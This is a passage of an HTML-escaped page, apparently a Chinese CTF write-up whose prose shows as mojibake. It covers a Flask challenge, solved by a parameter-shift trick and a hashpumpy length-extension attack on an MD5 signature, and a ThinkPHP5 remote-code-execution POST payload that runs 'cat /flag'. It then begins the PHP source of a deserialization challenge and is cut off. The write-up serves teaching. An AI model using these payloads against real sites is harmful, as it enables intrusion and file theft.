class=&#34;hljs-string&#34;&gt;&amp;quot;Sign Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;checkSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (getSign(self.action, self.param) == self.sign):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#generate Sign For Action Scan.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/geneSign&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;geneSign&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    action = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; getSign(action, param)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/De1ta&amp;#x27;&lt;/span&gt;,methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;challenge&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    action = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;action&amp;quot;&lt;/span&gt;))&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    sign = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sign&amp;quot;&lt;/span&gt;))&lt;br&gt;    ip = request.remote_addr&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(waf(param)):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No Hacker!!!!&amp;quot;&lt;/span&gt;&lt;br&gt;    task = Task(action, param, sign, ip)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; json.dumps(task.Exec())&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;code.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;).read()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;scan&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    socket.setdefaulttimeout(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; urllib.urlopen(param).read()[:&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;]&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;getSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;action, param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; hashlib.md5(secert_key + param + action).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; hashlib.md5(content).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;waf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    check=param.strip().lower()&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gopher&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;br&gt;    app.debug = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;    app.run(host=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;0.0.0.0&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å¯¹æ–‡ä»¶æ‰§è¡Œæ“ä½œçš„æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªscanï¼Œä¸€ä¸ªreadï¼ŒscanæŠŠæ–‡ä»¶å†™é“resault.txtï¼Œè€Œreadå¯ä»¥è¯»æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä½†æ˜¯è¦å®ç°è¯»å†™æ–‡ä»¶å°±è¦çªç ´hashçš„éªŒè¯ã€‚è¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªæ–¹æ³•æ¥çªç ´éªŒè¯ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡æœ¬èº«çš„ä»£ç æ¥ç»•è¿‡ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯é€šè¿‡hashpumpyå·¥å…·æ¥ç»•è¿‡&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šè¿‡æœ¬èº«ä»£ç ç»•è¿‡ï¼š&lt;ol&gt;
&lt;li&gt;å› ä¸ºåˆ¤æ–­æ˜¯scanè¿˜æ˜¯readæ“ä½œç”¨çš„æ˜¯&lt;code&gt;in&lt;/code&gt;è€Œä¸æ˜¯&lt;code&gt;=&lt;/code&gt;,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥scanreadå®ç°åŒæ—¶æ“ä½œ&lt;/li&gt;
&lt;li&gt;å“ˆå¸Œåˆ¤æ–­ï¼š&lt;code&gt;md5(secert_key+param+action)&lt;/code&gt;,secert_keyæ˜¯å›ºå®šçš„ï¼Œparamå’Œactionå¯æ§ï¼Œè€Œ&lt;code&gt;/geneSign&lt;/code&gt;å¯ä»¥æ‹¿åˆ°åŠ å¯†åçš„hashå€¼ï¼Œå½“æˆ‘ä»¬ä¼ å…¥param=flag.txtreadæ—¶ï¼Œç­‰å¼å·¦è¾¹ç­‰äº&lt;code&gt;md5(secert_key+&amp;#39;flag.txtread&amp;#39;+&amp;#39;scan&amp;#39;)&lt;/code&gt;,ç„¶åæˆ‘ä»¬è®¿é—®&lt;code&gt;/De1ta&lt;/code&gt;æ—¶param=flag.txt&amp;amp;action=readscan,æ­¤æ—¶ä¸¤ä¸ªmd5å€¼ç›¸ç­‰ä¹Ÿå°±ç»•è¿‡äº†éªŒè¯ï¼ŒæŠŠç¬¬ä¸€æ­¥å¾—åˆ°çš„hashä¼ å…¥ç¬¬äºŒéƒ¨å³å¯æ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»hashpumpyå·¥å…·ç»•è¿‡&lt;ol&gt;
&lt;li&gt;&lt;code&gt;hashpumpy.hashpump(&amp;#39;a36a5ba0e8b9bb78094cbdb641007508&amp;#39;, &amp;#39;scan&amp;#39;, &amp;#39;read&amp;#39;, 24)&lt;/code&gt;=&amp;gt;&lt;code&gt;(&amp;#39;ca08c49a467b1e8b465aa6acb96f20f1&amp;#39;, &amp;#39;scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read&amp;#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¼ å…¥param=flag.txtï¼Œaction=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00readï¼Œsing=ca08c49a467b1e8b465aa6acb96f20f1å³å¯æ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;BJDCTF-2nd-old-hack&#34;&gt;&lt;a href=&#34;#BJDCTF-2nd-old-hack&#34; class=&#34;headerlink&#34; title=&#34;[BJDCTF 2nd]old-hack&#34;&gt;&lt;/a&gt;[BJDCTF 2nd]old-hack&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ‰“å¼€ç½‘ç«™æç¤ºTHINKPHP5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/nongchaoer/p/12029478.html&#34;&gt;https://www.cnblogs.com/nongchaoer/p/12029478.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æµ‹è¯•payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight oxygene&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs oxygene&#34;&gt;POST ?s=xxx&lt;br&gt;&lt;br&gt;&lt;br&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;&amp;amp;&lt;span class=&#34;hljs-title&#34;&gt;server&lt;/span&gt;[&lt;span class=&#34;hljs-title&#34;&gt;REQUEST_METHOD&lt;/span&gt;]=&lt;span class=&#34;hljs-title&#34;&gt;cat&lt;/span&gt; /&lt;span class=&#34;hljs-title&#34;&gt;flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz&#34;&gt;&lt;a href=&#34;#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz&#34; class=&#34;headerlink&#34; title=&#34;[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz&#34;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span 